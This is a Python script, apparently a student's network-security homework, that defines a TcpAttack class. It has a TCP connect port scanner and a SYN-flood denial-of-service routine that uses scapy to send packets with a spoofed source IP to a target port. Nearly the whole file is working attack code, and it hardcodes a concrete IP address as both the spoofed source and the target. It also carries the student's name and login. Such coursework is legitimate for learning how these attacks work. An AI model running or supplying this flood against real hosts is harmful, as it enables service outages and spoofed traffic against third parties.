#!/usr/bin/env python3

#Homework Number: 08
#Name: Terrence Randall
#ECN login: randall7
#Due Date: Mar 23rd, 2020

import os
import sys
import socket
import re
from scapy.all import *

class TcpAttack:
    # spoofIP: String containing the IP address to spoof
    # targetIP: String containing the IP address of the target computer to attack
    def __init__(self, spoofIP, targetIP):
        self.spoofIP = spoofIP
        self.targetIP = targetIP

    # rangeStart: Integer designating the first port in the range of ports being scanned.
    # rangeEnd: Integer designating the last port in the range of ports being scanned
    # No return value, but writes open ports to openports.txt
    def scanTarget(self, rangeStart, rangeEnd):
        open_ports = []
        display = 0
        for testport in range(rangeStart, rangeEnd+1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            try:
                sock.connect((self.targetIP, testport))
                open_ports.append(testport)
                if display:
                    print(f"port open: {testport}")
            except:
                if display:
                    print(f"port closed: {testport}")

        FILEOUT = open('openports.txt', 'w')
        for x in open_ports:
            FILEOUT.write(str(x) + '\n')
        FILEOUT.close()

    # port: Integer designating the port that the attack will use
    # numSyn: Integer of SYN packets to send to target IP address at the given port
    # If the port is open, perform DoS attack and return 1. Otherwise return 0.
    def attackTarget(self, port, numSyn):
        FILEIN = open('openports.txt', 'r')
        for x in FILEIN:
            if int(x) == port:
                for i in range(numSyn):
                    IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
                    TCP_header = scapy.all.TCP(flags="S", sport=RandShort(), dport=int(x))
                    packet = IP_header / TCP_header
                    try:
                        send(packet)
                        print("Successfuly sent packet")
                    except Exception as error:
                        print(f"Error on iteration: {i}")
                        print(error)
                return 1
        return 0

if __name__ == '__main__':
    #if len(sys.argv) == 1:
    spoofIP = '68.50.234.107'; targetIP ='68.50.234.107'  # Will contain actual IP addresses in real script
    rangeStart = int(1) ;    rangeEnd = int(1024);    port = int(80)
    Tcp = TcpAttack(spoofIP, targetIP)
    #Tcp.scanTarget(rangeStart, rangeEnd)
    if Tcp.attackTarget(port, 3):
        print('port was open to attack')
    '''
    elif len(sys.argv) != 6:
        print("Proper Usage: python3 TcpAttack.py <spoofIP> <targetIP> <rangeStart> <rangeEnd> <port>")
    else:
        print("Running from user inputs")
        spoofIP = int(sys.argv[1]); targetIP = int(sys.argv[2])  # Will contain actual IP addresses in real script
        rangeStart = int(sys.argv[3]); rangeEnd = int(sys.argv[4]); port = int(sys.argv[5])
        Tcp = TcpAttack(spoofIP, targetIP)
        Tcp.scanTarget(rangeStart, rangeEnd)
        if Tcp.attackTarget(port, 10):
            print('port was open to attack')
    '''